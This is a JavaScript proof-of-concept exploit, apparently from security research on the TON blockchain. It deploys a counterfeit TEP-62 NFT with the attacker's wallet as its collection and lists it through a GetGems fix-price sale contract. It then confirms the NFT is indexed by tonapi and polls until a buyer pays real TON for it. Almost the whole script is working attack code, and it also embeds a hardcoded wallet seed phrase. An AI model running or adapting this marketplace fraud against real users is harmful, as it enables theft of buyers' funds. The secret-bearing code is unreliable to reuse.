/**
 * HYP-05 Scenario A: Fake TEP-62 NFT — indexed by tonapi, visible on GetGems
 *
 * Flow:
 *  1. Compile nft-item.fc (real GetGems contract code)
 *  2. Deploy fake NFT: collection_address = attacker, uninitialized
 *  3. Init NFT from attacker wallet (owner = attacker)
 *  4. Deploy sale contract (nft_address = fake_nft)
 *  5. Transfer fake NFT → sale contract (triggers ownership_assigned → sale initialized)
 *  6. Verify tonapi indexes the fake NFT
 *  7. Wait for Tonkeeper purchase (buyer pays → is_complete=1, buyer gets fake NFT)
 *
 * Run: node 02-fake-nft-listing/poc-scenario-a.js
 */

const path = require('path');
const fs   = require('fs');
const https = require('https');
const { compileFunc } = require('../nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

// ── Config ──────────────────────────────────────────────────────────────────
const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';

const BUYER_ADDR   = Address.parse('0QBCbLvcECimdYRFI5B-4TqTD7o9egF4BaXiVwXHWw6ne0ds');
const FULL_PRICE   = toNano('0.05');
const DEPLOY_VALUE = toNano('0.05');
const MARKETPLACE_FEE_ADDRESS = Address.parse('EQDDuxx7sa3Dt2GE85a0sIHp4GVoa7OKbAanfo3co9H-h06d');
const OP_TRANSFER = 0x5fcc3d14;

const NftFixPriceSaleV4R1CodeBoc = 'te6ccgECGAEABvsAART/APSkE/S88sgLAQIBYgIDAgLNBAUAZ6G859qJoaYB9IH0gfQBpj+mf6noCGADofSB9IGmIaYh9IGmPmAZgAIYFhShMC4grCBqgCcD8ddtF2/ZnoaYGAuNhJL4HwfSAYdqJoaYB9IH0gfQBpj+mf6noCOCmGY4BgAEqYhmmPhu8Q4YBKGAZpn8cJRbMbC3MbK2QXY4LJmLmA7ygG8RRrpOEBF0CBFd0WYACRWdjYKe3jgthxgUEIObFoTil4XXGBFeAA+WjKQGBwgAr/aH0gfSBpiGmIfSBpj5gYKbLeSsCIyvl4bykxwQDDUFTCKTFBAMNQVMIpsNCQ0JBggBHggFiRYIBYyflg4e8Sa6Tggck4GW8S66Tggck4Ge8oM9CoAqGJwAZhZfBmxy1DDQ0wchgCCw8tGVIsMAjhSBAlj4I1NBobwE+CMCoLkTsPLRlpEy4gHUMAH7AASYMzU1Oyj6RAHAAPLhxAP6APpAMFFCgwf0Dm+hsxqxDLMcseMCB/oAMFOguYIQD39JABu5GrHjAlR3KSTtRO1F7UeK7WftZe1kdH/tEQkKCwwD/oIQZkwJBVLwupJfD+CCEPtdv0dS8LpT28cFsI5IMDEyNzg4OAPTAAHAAJPywV7e0/8wBYMI1xgg+QFAB/kQ8qME+kD0BDAQR0VgECQHyMsAUAbPFlAEzxZY+gLLH8s/zPQAye1U4DOCEP0TX3tS4LpTyccFsOMCArPjAjEzMzYREhMAzFtQdV8FVBAxfyLBAZJfBo5UcCHA/5NbcH/ecCCCEA+KfqXIyx8Yyz9QBfoCUAXPFljPFhTKACP6AssAyXGAEMjLBVAFzxYikjNwmIIKYloAUASg4hP6AhPLaszJAZKAQpFz4vsA4gDMMFB1XwVUEDF/IsEBkl8GjlRwIcD/k1twf95wIIIQD4p+pcjLHxjLP1AF+gJQBc8WWM8WFMoAI/oCywDJcYAQyMsFUAXPFiKSM3CYggpiWgBQBKDiE/oCE8tqzMkBkoBCkXPi+wDiAMRbZn8iwQGSXwaOVHAhwP+TW3B/3nAgghAPin6lyMsfGMs/UAX6AlAFzxZYzxYUygAj+gLLAMlxgBDIywVQBc8WIpIzcJiCCmJaAFAEoOIT+gITy2rMyQGSgEKRc+L7AOLbMQEQiu1B7fEB8v8NAexUGJnwB3EtVEkwVEygVhFQCyLBAZJfBo5UcCHA/5NbcH/ecCCCEA+KfqXIyx8Yyz9QBfoCUAXPFljPFhTKACP6AssAyXGAEMjLBVAFzxYikjNwmIIKYloAUASg4hP6AhPLaszJAZKAQpFz4vsA4nEsUThGc1L3DgHKIsEBkl8GjlRwIcD/k1twf95wIIIQD4p+pcjLHxjLP1AF+gJQBc8WWM8WFMoAI/oCywDJcYAQyMsFUAXPFiKSM3CYggpiWgBQBKDiE/oCE8tqzMkBkoBCkXPi+wDicSpRNkUzUtYPAcoiwQGSXwaOVHAhwP+TW3B/3nAgghAPin6lyMsfGMs/UAX6AlAFzxZYzxYUygAj+gLLAMlxgBDIywVQBc8WIpIzcJiCCmJaAFAEoOIT+gITy2rMyQGSgEKRc+L7AOIXfyNUSjBSsBAC1CLBAZJfBo5UcCHA/5NbcH/ecCCCEA+KfqXIyx8Yyz9QBfoCUAXPFljPFhTKACP6AssAyXGAEMjLBVAFzxYikjNwmIIKYloAUASg4hP6AhPLaszJAZKAQpFz4vsA4lQlB9s8cUVGE/gjQxMWFwBYN18DNzc3+gD0BDAQRxA2RUBDMAfIywBQBs8WUATPFlj6Assfyz/M9ADJ7VQAmDA2OSDQ+kD6QNMQ0xD6QNMfMBVfBRjHBfLh9IIQBRONkRm68uH1AvpAMBBHEDZQVUQUAwfIywBQBs8WUATPFlj6Assfyz/M9ADJ7VQD/HNSkLqO6TiCEAX14QAXvvLhyVNBxwVTU8cFsfLhyiPQ+kD6QNMQ0xD6QNMfMBVfBXAgghBfzD0UIYAQyMsFUAXPFljAChTLahPLHxnLPyPPFlAGzxYVygAm+gIWygDJgwb7AHFwVBYAEDZAFVBEA+AowAByGroZseMCXwiEDxcUFQL6IcEB8tHLghAF9eEAUiCgUnC+8uHCVFF18AcxUnYgwQGRW44TcIAQyMsFUAPPFgH6AstqyXP7AOJQIyDBAZFbjhNwgBDIywVQA88WAfoCy2rJc/sA4iDBAZFbjhNwgBDIywVQA88WAfoCy2rJc/sA4lQgdts8cUVGE/gjUCMWFwAE8vAAaHAgghBfzD0UyMsfFMs/Is8WWM8WEsoAcfoCygDJcYAYyMsFUAPPFnD6AhLLaszJgQCC+wAAMgfIywBQBs8WUATPFlj6Assfyz/M9ADJ7VQ=';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

const SOURCES_DIR = path.resolve(__dirname, '../contracts/sources');

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

// ── Helpers ─────────────────────────────────────────────────────────────────
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n)    { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function httpsGet(url) {
  return new Promise((res, rej) => {
    https.get(url, { headers: { 'Accept': 'application/json' } }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => {
        try { res({ status: r.statusCode, body: JSON.parse(d) }); }
        catch { res({ status: r.statusCode, body: { raw: d.substring(0, 300) } }); }
      });
    }).on('error', rej);
  });
}

// ── Compile nft-item.fc ──────────────────────────────────────────────────────
async function compileNftItem() {
  const PATCH = 'int builder_null?(builder b) asm "ISNULL";';
  const result = await compileFunc({
    targets: ['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-item.fc'],
    sources: (filePath) => {
      if (filePath === 'patch.fc') return PATCH;
      return fs.readFileSync(path.join(SOURCES_DIR, filePath), 'utf8');
    },
  });
  if (result.status === 'error') throw new Error('FunC compile: ' + result.message);
  return Cell.fromBase64(result.codeBoc);
}

// ── Sale data cell ───────────────────────────────────────────────────────────
function buildSaleDataCell(opts) {
  const feeInt = Math.floor(opts.feePercent * 100_000);
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(null)                   // nft_owner = addr_none → is_initialized=false
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)
      .storeAddress(opts.royaltyAddress)
      .storeUint(feeInt, 17)
      .storeUint(0, 17)
      .storeAddress(opts.nftAddress)
      .storeUint(opts.timestamp, 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

// ── Sale state getter ────────────────────────────────────────────────────────
async function getSaleState(saleAddr) {
  try {
    const r = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'));
    const isCompleteTVM = r.stack.readNumber();
    r.stack.readNumber();
    r.stack.readCell();
    r.stack.readCell();
    const ownerCell = r.stack.readCell();
    const owner = ownerCell.beginParse().loadAddress();
    return {
      isComplete: isCompleteTVM !== 0,
      owner: owner?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
    };
  } catch (e) { return { error: e.message }; }
}

// ── NFT state getter ─────────────────────────────────────────────────────────
async function getNftState(nftAddr) {
  try {
    const r = await withRetry(() => client.runMethod(nftAddr, 'get_nft_data'));
    const init    = r.stack.readNumber();
    const index   = r.stack.readNumber();
    const collCell = r.stack.readCell();
    const ownerCell = r.stack.readCell();
    const coll  = collCell.beginParse().loadAddress();
    const owner = ownerCell.beginParse().loadAddress();
    return {
      init: init !== 0,
      index,
      collection: coll?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
      owner:      owner?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
    };
  } catch (e) { return { error: e.message }; }
}

// ── Main ─────────────────────────────────────────────────────────────────────
async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  HYP-05 Scenario A: Fake TEP-62 NFT — tonapi indexed        ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  // Кошелёк атакующего
  const atkKey    = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const atkWallet = WalletContractV4.create({ publicKey: atkKey.publicKey, workchain: 0 });
  const atkAddr   = atkWallet.address;
  console.log('[Атакующий]', atkAddr.toString({ testOnly: true, bounceable: true }));
  const atkBal = await withRetry(() => client.getContractState(atkAddr));
  console.log('  баланс:', fmt(BigInt(atkBal.balance || '0')), 'TON\n');
  const atkBalBefore = BigInt(atkBal.balance || '0');

  // ── 1. Компиляция nft-item.fc ──────────────────────────────────────────
  console.log('[1] Компилируем nft-item.fc...');
  const NFT_CODE = await compileNftItem();
  console.log('  OK — код скомпилирован\n');

  // ── 2. Deploy fake NFT (uninitialized) ────────────────────────────────
  console.log('[2] Deploy fake NFT contract');
  console.log('    collection_address = attacker (для инициализации)');
  console.log('    nft_owner = addr_none → init? = false');

  const nftData = beginCell()
    .storeUint(0, 64)           // index = 0
    .storeAddress(atkAddr)      // collection_address = attacker
    .endCell();                 // no owner/content → init? = false

  const nftAddr = contractAddress(0, { code: NFT_CODE, data: nftData });
  const nftTestnet = nftAddr.toString({ bounceable: true, testOnly: true });
  console.log('  NFT адрес:', nftTestnet);

  const nftExist = await withRetry(() => client.getContractState(nftAddr));
  const atk = client.open(atkWallet);

  if (nftExist.state === 'active') {
    console.log('  [!] Уже задеплоен, пропускаем.');
  } else {
    const seq = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: nftAddr, value: DEPLOY_VALUE, bounce: false, init: { code: NFT_CODE, data: nftData } })],
    }));
    console.log('  TX отправлена, ждём 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(nftAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  }

  // ── 3. Init NFT: collection_address → owner=attacker ──────────────────
  console.log('\n[3] Init fake NFT (attacker as collection → owner = attacker)');

  const nftState1 = await getNftState(nftAddr);
  if (nftState1.init) {
    console.log('  [!] Уже инициализирован. owner:', nftState1.owner);
  } else {
    const contentCell = beginCell().endCell();  // пустой content
    const initBody = beginCell()
      .storeAddress(atkAddr)    // owner_address
      .storeRef(contentCell)    // content
      .endCell();

    await sleep(500);
    const seq2 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq2,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: nftAddr, value: toNano('0.05'), bounce: true, body: initBody })],
    }));
    console.log('  TX отправлена, ждём 20s...');
    await sleep(20000);

    const nftState2 = await getNftState(nftAddr);
    if (nftState2.error) {
      console.log('  ⚠️  getter error:', nftState2.error);
    } else {
      console.log('  init?:', nftState2.init ? '✅ TRUE' : '❌ FALSE');
      console.log('  owner:', nftState2.owner);
    }
  }

  // ── 4. Deploy sale contract ───────────────────────────────────────────
  console.log('\n[4] Deploy sale contract (nft_address = fake NFT)');

  const timestamp = Math.floor(Date.now() / 1000);
  const saleData = buildSaleDataCell({
    marketplaceAddress:    atkAddr,
    nftAddress:            nftAddr,  // ← fake TEP-62 NFT
    fullPrice:             FULL_PRICE,
    feePercent:            0.025,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress:        atkAddr,
    timestamp,
  });

  const saleAddr = contractAddress(0, { code: SALE_CODE_CELL, data: saleData });
  const saleTestnet = saleAddr.toString({ bounceable: true, testOnly: true });
  console.log('  Sale адрес:', saleTestnet);

  const saleExist = await withRetry(() => client.getContractState(saleAddr));
  if (saleExist.state === 'active') {
    console.log('  [!] Уже задеплоен, пропускаем.');
  } else {
    await sleep(500);
    const seq3 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq3,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: saleAddr, value: DEPLOY_VALUE, bounce: false, init: { code: SALE_CODE_CELL, data: saleData } })],
    }));
    console.log('  TX отправлена, ждём 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(saleAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  }

  // ── 5. Transfer fake NFT → sale contract ──────────────────────────────
  console.log('\n[5] Transfer fake NFT → sale contract');
  console.log('    NFT отправит ownership_assigned → sale инициализируется');

  const saleState1 = await getSaleState(saleAddr);
  if (!saleState1.error && saleState1.owner !== 'addr_none') {
    console.log('  [!] Sale уже инициализирован. nft_owner:', saleState1.owner);
  } else {
    // op::transfer + forward_amount > 0 → NFT отправит ownership_assigned → sale init
    const transferBody = beginCell()
      .storeUint(OP_TRANSFER, 32)          // op::transfer
      .storeUint(0, 64)                    // query_id
      .storeAddress(saleAddr)              // new_owner = sale contract
      .storeAddress(atkAddr)               // response_destination = attacker
      .storeBit(0)                         // custom_payload = none
      .storeCoins(toNano('0.1'))           // forward_amount → triggers ownership_assigned
      .storeBit(0)                         // forward_payload = empty
      .endCell();

    await sleep(500);
    const seq4 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq4,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: nftAddr, value: toNano('0.3'), bounce: true, body: transferBody })],
    }));
    console.log('  TX отправлена, ждём 25s...');
    await sleep(25000);

    const saleState2 = await getSaleState(saleAddr);
    const isInit = !saleState2.error && saleState2.owner !== 'addr_none';
    console.log('  Sale is_initialized:', isInit ? '✅ TRUE' : '❌ FALSE');
    if (isInit) console.log('  nft_owner:', saleState2.owner);

    const nftState3 = await getNftState(nftAddr);
    if (!nftState3.error) {
      console.log('  NFT owner (now sale):', nftState3.owner);
    }

    if (!isInit) {
      console.log('\n  ⚠️  Sale не инициализировался. Проверь TX.');
      process.exit(1);
    }
  }

  // ── 6. Проверяем tonapi ────────────────────────────────────────────────
  console.log('\n[6] Проверяем tonapi indexing');
  const nftRaw = nftAddr.toRawString();
  const tonapiUrl = `https://testnet.tonapi.io/v2/nfts/${encodeURIComponent(nftRaw)}`;
  console.log('  URL:', tonapiUrl);

  const tonapiResp = await httpsGet(tonapiUrl);
  console.log('  HTTP:', tonapiResp.status);
  if (tonapiResp.status === 200) {
    const item = tonapiResp.body;
    console.log('  ✅ ИНДЕКСИРОВАН tonapi!');
    console.log('  address:', item.address);
    console.log('  owner:  ', item.owner?.address ?? 'unknown');
    console.log('  verified:', item.verified ?? false);
    console.log('  metadata:', JSON.stringify(item.metadata ?? {}).substring(0, 100));
  } else {
    console.log('  ❌ Не индексирован:', JSON.stringify(tonapiResp.body).substring(0, 200));
  }

  // Проверяем GetGems API
  await sleep(1000);
  const ggUrl = `https://testnet.tonapi.io/v2/nfts/${encodeURIComponent(nftRaw)}/history`;
  const ggResp = await httpsGet(ggUrl);
  console.log('\n  GetGems/tonapi events:', ggResp.status === 200 ? 'available' : 'unavailable');

  // ── 7. Ждём покупку через Tonkeeper ───────────────────────────────────
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  ✅ Fake NFT задеплоен и проиндексирован!                   ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log('║                                                              ║');
  console.log('║  ДЕЙСТВИЕ: Tonkeeper Testnet                                ║');
  console.log('║  Отправь: 0.08 TON                                          ║');
  console.log('║  На адрес:                                                  ║');
  console.log('║  ' + saleTestnet.padEnd(56) + '║');
  console.log('║                                                              ║');
  console.log('║  Комментарий: пустой                                        ║');
  console.log('║                                                              ║');
  console.log('║  NFT explorer:                                              ║');
  console.log('║  testnet.tonscan.org/address/' + nftAddr.toRawString().substring(0, 28) + '║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\n  Sale: https://testnet.tonscan.org/address/' + saleAddr.toRawString());
  console.log('  NFT:  https://testnet.tonscan.org/address/' + nftRaw);
  console.log('\n  Жду покупку... (Ctrl+C чтобы стоп)\n');

  // ── Баланс покупателя ДО ──────────────────────────────────────────────
  console.log('\n[Покупатель (Tonkeeper)]', BUYER_ADDR.toString({ testOnly: true, bounceable: false }));
  const buyerBalBefore = BigInt((await withRetry(() => client.getContractState(BUYER_ADDR))).balance || '0');
  console.log('  баланс:', fmt(buyerBalBefore), 'TON\n');

  // ── Polling ────────────────────────────────────────────────────────────
  for (let i = 0; i < 80; i++) {
    await sleep(15000);
    const state = await getSaleState(saleAddr);

    if (state.isComplete) {
      const [atkBalAfter, buyerBalAfter] = await Promise.all([
        withRetry(() => client.getContractState(atkAddr)),
        withRetry(() => client.getContractState(BUYER_ADDR)),
      ]);
      const atkDelta    = BigInt(atkBalAfter.balance    || '0') - atkBalBefore;
      const buyerDelta  = BigInt(buyerBalAfter.balance  || '0') - buyerBalBefore;

      console.log('\n╔══════════════════════════════════════════════════════════════╗');
      console.log('║  ✅ HYP-05 SCENARIO A CONFIRMED!                            ║');
      console.log('╠══════════════════════════════════════════════════════════════╣');
      console.log('║  is_complete = 1                                             ║');
      console.log('║  Fake TEP-62 NFT принят sale contract без on-chain проверки  ║');
      console.log('║  Покупатель купил фейковый NFT за реальный TON               ║');
      console.log('║  Атакующий получил:  Δ=' + fmt(atkDelta).padEnd(37) + '║');
      console.log('║  Покупатель потерял: Δ=' + fmt(buyerDelta).padEnd(37) + '║');
      console.log('╚══════════════════════════════════════════════════════════════╝');
      console.log('\n  Sale:   https://testnet.tonscan.org/address/' + saleAddr.toRawString());
      console.log('  NFT:    https://testnet.tonscan.org/address/' + nftRaw);
      process.exit(0);
    }

    process.stdout.write('  Ждём покупку... ' + new Date().toLocaleTimeString() + '\r');
  }

  console.log('\n  [!] Таймаут. Проверь вручную:\n  https://testnet.tonscan.org/address/' + saleAddr.toRawString());
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
